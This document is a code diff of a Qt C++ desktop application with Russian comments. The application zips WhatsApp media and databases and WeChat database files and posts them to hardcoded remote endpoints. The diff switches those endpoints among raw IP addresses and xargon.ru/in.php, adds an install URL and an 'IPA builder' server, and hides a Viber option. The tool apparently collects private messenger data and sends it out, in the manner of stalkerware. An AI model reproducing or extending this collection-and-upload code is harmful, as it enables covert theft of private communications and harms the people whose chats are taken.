@@ -13,6 +13,8 @@ MainWindow::MainWindow(QWidget *parent) :
 {
     ui->setupUi(this);
 
+    ui->ViberAppCheckBox->setVisible(false);
+
    setBackUpRootPath();
    showAllBackups();
    logTextBrowser = ui->logTextBrowser;
@@ -22,7 +24,10 @@ MainWindow::MainWindow(QWidget *parent) :
    WHATSAPP_MEDIA_ZIP_FILENAME = "wmedia.zip";
    WHATSAPP_MEDIA_ZIP_POST_NAME = "wzipfile";
    WHATSAPP_DB_POST_NAME = "wdbfile";
-   IPA_BUILDER_MAC_SERVER_IP = "http://88.204.154.151";
+  // IPA_BUILDER_MAC_SERVER_URL = "http://88.204.154.158/in.php";
+   //IPA_BUILDER_MAC_SERVER_IP = "http://88.204.154.158";
+   IPA_BUILDER_MAC_SERVER_URL = "http://xargon.ru/in.php";
+   IPA_BUILDER_MAC_SERVER_IP = "http://xargon.ru";
    INSTALL_URL = "https://xargon.ru/install";
 
    WECHAT_DB_FILE = "wechat_dbfile.zip";
@@ -971,7 +976,7 @@ bool MainWindow::sendAllBackup (QMap <QString, QString>* mapPostAndFilePath, QSt
     //"хвост" запроса
     postData.append("--"+boundary+"--\r\n");
 
-    QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
+    QNetworkRequest request(QUrl("http://88.204.154.158/in.php"));
     request.setHeader(QNetworkRequest::ContentTypeHeader,
         "multipart/form-data; boundary="+boundary);
     request.setHeader(QNetworkRequest::ContentLengthHeader,
@@ -1090,7 +1095,7 @@ bool MainWindow::sendZip (QString zipFullPath, QString uuid){
     //"хвост" запроса
     postData.append("--"+boundary+"--\r\n");
 
-    QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
+    QNetworkRequest request(QUrl("http://88.204.154.158/in.php"));
     request.setHeader(QNetworkRequest::ContentTypeHeader,
         "multipart/form-data; boundary="+boundary);
     request.setHeader(QNetworkRequest::ContentLengthHeader,
@@ -1148,7 +1153,7 @@ void MainWindow::sendReportToServerReply(QNetworkReply* reply){
 void MainWindow::sendPost(){
 
     //QUrl serviceUrl = QUrl("http://myserver/myservice.asmx");
-     QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
+     QNetworkRequest request(QUrl("http://88.204.154.158/in.php"));
      QByteArray postData;
      postData.append("uuid=925dsfh90325793fdsif0932878fdoisf");
 
@@ -1187,7 +1192,7 @@ void  MainWindow::sendMultiPart(){
         multiPart->append(textPart);
         multiPart->append(imagePart);
 
-       QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
+       QNetworkRequest request(QUrl("http://88.204.154.158/in.php"));
 
         QNetworkAccessManager *networkManager= new QNetworkAccessManager;
         networkManager->post(request, multiPart);
